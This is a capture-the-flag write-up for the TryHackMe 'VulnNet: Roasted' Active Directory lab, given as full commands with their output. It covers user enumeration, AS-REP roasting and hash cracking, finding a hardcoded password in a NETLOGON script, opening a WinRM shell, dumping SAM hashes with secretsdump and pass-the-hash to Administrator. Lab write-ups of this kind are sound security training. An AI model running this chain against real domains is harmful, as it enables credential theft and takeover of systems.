# **VulnNet: Roasted - TryHackMe**

*Target Ip. Address : 10.48.152.148*

Let's start with nmap scan to see the open ports.

```bash
kali@kali:nmap -sV -sC 10.48.152.148
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 15:02 +0545
Nmap scan report for 10.48.152.148
Host is up (0.048s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-05 09:17:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-05T09:17:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.84 seconds
```

There are many open ports, which are common on windows-based challenges.
Let's add the domain name in our hosts file.

```bash
kali@kali:cat /etc/hosts
10.48.152.148   vulnnet-rst.local

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Let's see if we can get any usernames, we will br using impacket-lookupsid.

```bash
kali@kali:impacket-lookupsid vulnnet-rst.local/guest@10.48.152.148
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.48.152.148
[*] StringBinding ncacn_np:10.48.152.148[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

We get some usernames, let's save them in a text file, and see if they have no preauth set.

```bash
kali@kali:impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip 10.48.152.148
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:e7dbd6706.....1695b48e222d59ded
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH
```

So, we found a hash for user t-skid, let's crack the hash.

```bash
kali@kali:john  --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                            
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj...9*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
1g 0:00:00:02 DONE (2026-02-05 15:17) 0.3571g/s 1135Kp/s 1135Kc/s 1135KC/s tj3929..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We successfully cracked the hash for user t-skid, let's login to smb and see if it has anything for us.

```bash
kali@kali:smbclient -U t-skid \\\\10.48.152.148\\NETLOGON
Password for [WORKGROUP\t-skid]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 17 05:00:49 2021
  ..                                  D        0  Wed Mar 17 05:00:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 05:03:14 2021

                8771839 blocks of size 4096. 4494568 blocks available
smb: \> get ResetPassword.vbs 
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (7.2 KiloBytes/sec) (average 7.2 KiloBytes/sec)
smb: \> 
```

We find ResetPassword.vbs, let's see what secret it holds for us.

```ResetPassword.vbs
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bN...ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTName
```

We find a pair of credentials inside there.

```credentials
strUserNTName = "a-whitehat"
strPassword = "bN...ht"
```

Let's see what these credentials take us to.

```bash
kali@kali:nxc winrm 10.48.152.148 -u a-whitehat -p 'bN....ht'                                                                     
WINRM       10.48.152.148   5985   WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.48.152.148   5985   WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bN....ht (Pwn3d!)
```

Bingo, we have a valid credentials for winrm.
Let's login as user a-whitehat.

```bash
kali@kali:evil-winrm -i 10.48.152.148 -u a-whitehat -p 'bN....ht'                                                                       
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> 
```

We find user.txt in another user's Desktop. 

```bash
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
THM{72.....ed}
```

Although we can travrse to Administrator Directort, we can't read the final flag system.
txt, because of UAC.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
Access to the path 'C:\Users\Administrator\Desktop\system.txt' is denied.
At line:1 char:1
+ type system.txt
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Admini...ktop\system.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Let's try to use impacket-secretsdump to see if we can get admin hash.

```bash
kali@kali:impacket-secretsdump vulnnet-rst.local/a-whitehat:bN...ht@10.48.152.148
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2.....9d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
.
.
.
```

We have the hash of Administrator, now we can login as Administrator using evil-winrm.

```bash
kali@kali:evil-winrm -i 10.48.152.148 -u Administrator -H c2.....9d                                                  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Read the final flag (System.txt) at Desktop folder and conclude this challenge.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
THM{16.....4c}
```
